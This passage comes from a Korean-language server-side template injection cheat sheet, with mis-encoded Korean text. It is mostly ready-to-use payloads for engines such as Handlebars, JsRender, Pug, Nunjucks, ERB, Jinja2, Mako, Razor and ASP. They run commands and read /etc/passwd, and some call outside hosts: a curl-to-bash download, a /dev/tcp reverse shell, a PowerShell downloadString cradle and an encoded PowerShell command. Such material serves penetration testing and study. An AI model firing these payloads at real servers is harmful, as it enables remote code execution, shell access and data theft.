* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)ì€ XML íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ì„œë¥¼ ì—¬ëŸ¬ ë¶€ë¶„ìœ¼ë¡œ ë‚˜ëˆ„ëŠ” PHP ë¹„ì»´íŒŒì¼ë§ í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**ì¶”ê°€ ì •ë³´**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

ê²½ë¡œ ìˆœíšŒ (ë” ë§ì€ ì •ë³´ëŠ” [ì—¬ê¸°](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= ì—ëŸ¬
* ${7\*7} = ${7\*7}
* ì•„ë¬´ê²ƒë„ ì—†ìŒ
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**ì¶”ê°€ ì •ë³´**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **í…œí”Œë¦¿** | **ì„¤ëª…**                                |
| ---------- | --------------------------------------- |
|            | í‰ê°€ ë° ì¶œë ¥ ë Œë”ë§                      |
|            | í‰ê°€ ë° HTML ì¸ì½”ë”©ëœ ì¶œë ¥ ë Œë”ë§        |
|            | ì£¼ì„                                    |
| and        | ì½”ë“œ í—ˆìš© (ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë¨)        |

* \= 49

**í´ë¼ì´ì–¸íŠ¸ ì¸¡**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**ì„œë²„ ì¸¡**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**ì¶”ê°€ ì •ë³´**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**ì„œë²„ ì¸¡ ë Œë”ë§ ì˜ˆì‹œ**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**ì¶”ê°€ ì •ë³´**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = ì¶œë ¥ ì—†ìŒ
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = ì˜¤ë¥˜
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**ì¶”ê°€ ì •ë³´**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (ë£¨ë¹„)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = ì—ëŸ¬`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**ì¶”ê°€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (ë£¨ë¹„)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**ì¶”ê°€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

íŒŒì´ì¬ì—ì„œ **ìƒŒë“œë°•ìŠ¤ ìš°íšŒë¥¼ í†µí•œ ì„ì˜ì˜ ëª…ë ¹ ì‹¤í–‰**ì— ëŒ€í•œ íŠ¸ë¦­ì„ ë°°ìš°ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**ì¶”ê°€ ì •ë³´**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[ê³µì‹ ì›¹ì‚¬ì´íŠ¸](http://jinja.pocoo.org)

> Jinja2ëŠ” Pythonìš©ìœ¼ë¡œ ê°œë°œëœ ì™„ì „í•œ ê¸°ëŠ¥ì„ ê°–ì¶˜ í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. ì „ì²´ ìœ ë‹ˆì½”ë“œ ì§€ì›, ì„ íƒì ìœ¼ë¡œ í†µí•©ëœ ìƒŒë“œë°•ìŠ¤ ì‹¤í–‰ í™˜ê²½, ë„ë¦¬ ì‚¬ìš©ë˜ë©° BSD ë¼ì´ì„ ìŠ¤ê°€ ìˆìŠµë‹ˆë‹¤.

* `{{7*7}} = ì—ëŸ¬`
* `${7*7} = ${7*7}`
* `{{foobar}} ì•„ë¬´ê²ƒë„ ì—†ìŒ`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - í…œí”Œë¦¿ í˜•ì‹**

Jinja2ëŠ” íŒŒì´ì¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ê°•ë ¥í•œ í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. ì´ ì—”ì§„ì€ HTML, XML, JSON ë“± ë‹¤ì–‘í•œ í˜•ì‹ì˜ í…œí”Œë¦¿ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Jinja2 í…œí”Œë¦¿ì€ ì¤‘ê´„í˜¸(`{{ }}`)ì™€ ë°±ìŠ¬ë˜ì‹œ(`{% %}`)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³€ìˆ˜, ì œì–´ë¬¸, ë°˜ë³µë¬¸ ë“±ì„ í‘œí˜„í•©ë‹ˆë‹¤.

**Jinja2 - Template Injection**

í…œí”Œë¦¿ ì‚½ì…(Server-Side Template Injection, SSTI)ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì‹¬ê°í•œ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ ì—”ì§„ì— ì§ì ‘ ì „ë‹¬í•˜ê³  ì‹¤í–‰ë˜ë„ë¡ í•˜ëŠ” ê³µê²©ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. SSTIë¥¼ ì´ìš©í•˜ë©´ ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì˜ ì˜ˆ**

ë‹¤ìŒì€ Jinja2 í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì˜ ì˜ˆì…ë‹ˆë‹¤.

```python
from jinja2 import Template

template = Template("Hello, {{ name }}!")
output = template.render(name=request.GET['name'])
```

ìœ„ì˜ ì½”ë“œì—ì„œ `name` ë³€ìˆ˜ëŠ” ì‚¬ìš©ì ì…ë ¥ìœ¼ë¡œë¶€í„° ë°›ì•„ì˜¨ ê°’ìœ¼ë¡œ ì±„ì›Œì§‘ë‹ˆë‹¤. í•˜ì§€ë§Œ ì‚¬ìš©ìê°€ ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì…ë ¥í•˜ë©´, í•´ë‹¹ ì½”ë“œê°€ í…œí”Œë¦¿ ì—”ì§„ì— ì˜í•´ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì˜ ìœ„í—˜ì„±**

í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì€ ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ìœ„í—˜í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. ê³µê²©ìëŠ” ì„œë²„ì˜ í™˜ê²½ ë³€ìˆ˜, íŒŒì¼ ì‹œìŠ¤í…œ, ë°ì´í„°ë² ì´ìŠ¤ ë“±ì— ì ‘ê·¼í•˜ì—¬ ì¤‘ìš”í•œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ê±°ë‚˜ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ì„œë²„ì˜ ì œì–´ê¶Œì„ íšë“í•˜ì—¬ ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ ì‹œìŠ¤í…œì„ ë§ˆë¹„ì‹œí‚¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²© ë°©ì§€í•˜ê¸°**

í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì¡°ì¹˜ë¥¼ ì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ê°’ìœ¼ë¡œ í•„í„°ë§í•˜ê±°ë‚˜ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
- í…œí”Œë¦¿ ì—”ì§„ì˜ ë³´ì•ˆ ì„¤ì •ì„ ê°•í™”í•©ë‹ˆë‹¤.
- ìµœì‹  ë²„ì „ì˜ í…œí”Œë¦¿ ì—”ì§„ì„ ì‚¬ìš©í•˜ê³ , ë³´ì•ˆ íŒ¨ì¹˜ë¥¼ ì ìš©í•©ë‹ˆë‹¤.
- í…œí”Œë¦¿ ì—”ì§„ì˜ ë™ì‘ì„ ì œí•œí•˜ëŠ” ì ì ˆí•œ ì„¤ì •ì„ ì ìš©í•©ë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²© íƒì§€í•˜ê¸°**

í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì„ íƒì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë¡œê·¸ë¥¼ ë¶„ì„í•˜ì—¬ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë™ì‘ì„ íƒì§€í•©ë‹ˆë‹¤.
- í…œí”Œë¦¿ ì—”ì§„ì˜ ë¡œê¹… ê¸°ëŠ¥ì„ í™œì„±í™”í•˜ì—¬ ê³µê²© ì‹œë„ë¥¼ ì¶”ì í•©ë‹ˆë‹¤.
- ìë™í™”ëœ ì·¨ì•½ì  ìŠ¤ìºë„ˆë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ íƒì§€í•©ë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²© ì˜ˆë°©ì„ ìœ„í•œ ê¶Œì¥ ì‚¬í•­**

í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì„ ì˜ˆë°©í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ê¶Œì¥ ì‚¬í•­ì„ ë”°ë¥´ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

- ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì…ë ¥ì„ í…œí”Œë¦¿ ì—”ì§„ì— ì§ì ‘ ì „ë‹¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
- ì‚¬ìš©ì ì…ë ¥ì„ í•„í„°ë§í•˜ê±°ë‚˜ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬í•˜ì—¬ ì•ˆì „í•œ ê°’ìœ¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.
- í…œí”Œë¦¿ ì—”ì§„ì˜ ë³´ì•ˆ ì„¤ì •ì„ ê°•í™”í•˜ê³ , ìµœì‹  ë²„ì „ ë° ë³´ì•ˆ íŒ¨ì¹˜ë¥¼ ì ìš©í•©ë‹ˆë‹¤.
- ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë¡œê·¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë™ì‘ì„ ì‹ ì†í•˜ê²Œ íƒì§€í•©ë‹ˆë‹¤.

**Jinja2 - í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì— ëŒ€í•œ ì¶”ê°€ ì •ë³´**

í…œí”Œë¦¿ ì‚½ì… ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒ ë§í¬ë¥¼ ì°¸ê³ í•˜ì„¸ìš”.

- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [OWASP - Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`ì— ì˜ì¡´í•˜ì§€ ì•ŠëŠ” RCE**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):

Server-Side Template Injection (SSTI)ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì‹¬ê°í•œ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ í…œí”Œë¦¿ ì—”ì§„ì— ì…ë ¥ëœ ì‚¬ìš©ì ì œê³µ ë°ì´í„°ë¥¼ ì•ˆì „í•˜ê²Œ ì²˜ë¦¬í•˜ì§€ ì•Šì„ ë•Œ ë°œìƒí•©ë‹ˆë‹¤. Jinja2ì™€ ê°™ì€ í…œí”Œë¦¿ ì—”ì§„ì€ ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ìœ¼ë¡œ í•´ì„í•˜ê³  ì‹¤í–‰í•˜ê¸° ë•Œë¬¸ì—, ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ í…œí”Œë¦¿ì— Python ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì•…ì˜ì ì¸ í…œí”Œë¦¿ ì½”ë“œë¥¼ ì‚½ì…í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì‹œìŠ¤í…œì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ `__builtins__`ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ë„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`__builtins__`ëŠ” Pythonì˜ ë‚´ì¥ ëª¨ë“ˆì„ í¬í•¨í•˜ëŠ” ë”•ì…”ë„ˆë¦¬ì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ SSTI ê³µê²©ì€ `__builtins__`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ì·¨ì•½ì ì€ `__builtins__`ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ë„ RCE(Remote Code Execution)ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ê³µê²©ìëŠ” í…œí”Œë¦¿ ì—”ì§„ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ì„œë²„ ì¸¡ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì‹œìŠ¤í…œì— ëŒ€í•œ ì™„ì „í•œ ì œì–´ê¶Œì„ íšë“í•˜ê±°ë‚˜ ì¤‘ìš”í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ì…ë ¥ ë°ì´í„°ë¥¼ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë°©ë²•ìœ¼ë¡œ ì²˜ë¦¬í•´ì•¼ í•©ë‹ˆë‹¤. ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ìœ¼ë¡œ í•´ì„í•˜ê¸° ì „ì— ì ì ˆí•œ í•„í„°ë§ê³¼ ê²€ì¦ì„ ìˆ˜í–‰í•˜ì—¬ ì•…ì˜ì ì¸ ì½”ë“œ ì‚½ì…ì„ ë°©ì§€í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ, í…œí”Œë¦¿ ì—”ì§„ì˜ ìµœì‹  ë²„ì „ì„ ì‚¬ìš©í•˜ê³  ë³´ì•ˆ íŒ¨ì¹˜ë¥¼ ì ìš©í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinjaë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)ì—ì„œ ë‹¤ë¥¸ í˜ì´ë¡œë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**ì¶”ê°€ ì •ë³´**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= ì„±ê³µ`
* `@() <= ì„±ê³µ`
* `@("{{code}}") <= ì„±ê³µ`
* `@ <= ì„±ê³µ`
* `@{} <= ì˜¤ë¥˜!`
* `@{ <= ì˜¤ë¥˜!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NETì˜ `System.Diagnostics.Process.Start` ë©”ì„œë“œëŠ” ì„œë²„ì—ì„œ ì–´ë–¤ í”„ë¡œì„¸ìŠ¤ë“  ì‹œì‘í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì›¹ì‰˜ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ì•± ì˜ˆì œëŠ” [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì¶”ê°€ ì •ë³´**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nothing
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**ì¶”ê°€ ì •ë³´**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

íŒŒì¼ì´ perlì´ì§€ë§Œ Rubyì˜ ERB íƒœê·¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = ì—ëŸ¬`
```
<%= perl code %>
<% perl code %>
```
### GOì—ì„œì˜ SSTI(Server-Side Template Injection)

Goì˜ í…œí”Œë¦¿ ì—”ì§„ì—ì„œëŠ” íŠ¹ì •í•œ í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš© ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* `{{ . }}`: ë°ì´í„° êµ¬ì¡° ì…ë ¥ì„ ê³µê°œí•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `Password` ì†ì„±ì„ ê°€ì§„ ê°ì²´ê°€ ì „ë‹¬ë˜ë©´ `{{ .Password }}`ë¥¼ í†µí•´ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `{{printf "%s" "ssti" }}`: ë¬¸ìì—´ "ssti"ë¥¼ í‘œì‹œí•˜ëŠ” ê²ƒì„ ê¸°ëŒ€í•©ë‹ˆë‹¤.
* `{{html "ssti"}}`, `{{js "ssti"}}`: ì´ëŸ¬í•œ í˜ì´ë¡œë“œëŠ” "html"ì´ë‚˜ "js"ë¥¼ ì¶”ê°€í•˜ì§€ ì•Šê³  "ssti"ë¥¼ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. Go ë¬¸ì„œ [ì—¬ê¸°](https://golang.org/pkg/text/template)ì—ì„œ ë” ë§ì€ ì§€ì‹œë¬¸ì„ ì°¾ì•„ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**XSS Exploitation**

